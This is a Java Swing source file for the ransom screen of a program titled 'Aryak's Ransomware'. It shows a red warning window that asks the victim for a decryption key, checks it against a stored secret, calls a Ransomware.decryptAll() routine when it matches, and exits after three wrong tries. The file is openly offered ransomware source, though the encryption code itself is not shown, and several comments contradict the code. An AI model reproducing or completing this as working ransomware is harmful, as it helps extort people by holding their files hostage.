import javax.swing.*;
import java.awt.*;

public class WarningForm extends JFrame {

    private final JTextField textField;
    int attempts = 0;
    static final int MAX_ATTEMPTS = 3;

    public WarningForm() {
        // Set up the frame
        setTitle("Aryak's Ransomware");
        setSize(700, 550);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setLayout(new GridBagLayout());
        GridBagConstraints gbc = new GridBagConstraints();

        // Load and resize the image
        ImageIcon originalIcon = new ImageIcon("img/ransomware.jpeg"); // Specify the path to your image
        Image resizedImage = originalIcon.getImage().getScaledInstance(600, 300, Image.SCALE_SMOOTH); // Resize the image
        ImageIcon resizedIcon = new ImageIcon(resizedImage);
        JLabel imageLabel = new JLabel(resizedIcon);

        // Set background color to light green
        getContentPane().setBackground(new Color(220, 20, 60)); // Dark red color

        // Add image to the grid
        gbc.gridx = 0; // Column 0
        gbc.gridy = 0; // Row 0
        gbc.insets = new Insets(10, 10, 10, 10); // Add some padding
        gbc.anchor = GridBagConstraints.CENTER; // Center the image
        add(imageLabel, gbc);

        // Create and add instruction label
        // Create and add instruction label with a warning style
        JLabel instructionLabel = new JLabel("Please enter decryption key :");
        instructionLabel.setForeground(Color.WHITE);
        instructionLabel.setFont(new Font("Arial", Font.BOLD, 14)); // Bold font
        gbc.gridy = 1; // Move to row 1
        add(instructionLabel, gbc);

        // Create and add the text field
        textField = new JTextField(20);
        gbc.gridy = 2; // Move to row 1
        add(textField, gbc);

        // Create and add the submit button
        JButton submitButton = new JButton("RESTORE MY FILES");
        gbc.gridy = 3; // Move to row 2
        add(submitButton, gbc);


        // Add action listener to the button
        submitButton.addActionListener(e -> {

            String inputText = textField.getText();
            if ( !inputText.isEmpty() ) {

                if ( inputText.equals(Constants.SECRET_KEY) ) {

                    try {
                        // invoke decryption function
                        Ransomware.decryptAll();
                    } catch (CryptoException ex) {
                        throw new RuntimeException(ex);
                    }

                    JOptionPane.showMessageDialog(null, "Your files are being decrypted. Please wait patiently");
                    System.exit(0);

                } else {

                    attempts++;
                    if ( attempts >= MAX_ATTEMPTS ) {
                        JOptionPane.showMessageDialog(null, "Attempts exceeded!", "WARNING", JOptionPane.WARNING_MESSAGE);
                        System.exit(0);
                    } else {
                        JOptionPane.showMessageDialog(null, "Incorrect key - Pls be careful : " + (MAX_ATTEMPTS - attempts) + " more attempts remaining!","INCORRECT ATTEMPT", JOptionPane.WARNING_MESSAGE);
                    }
                }
            } else {
                JOptionPane.showMessageDialog(null, "Warning: The text field is empty!", "Warning", JOptionPane.WARNING_MESSAGE);
            }
        });
    }
}
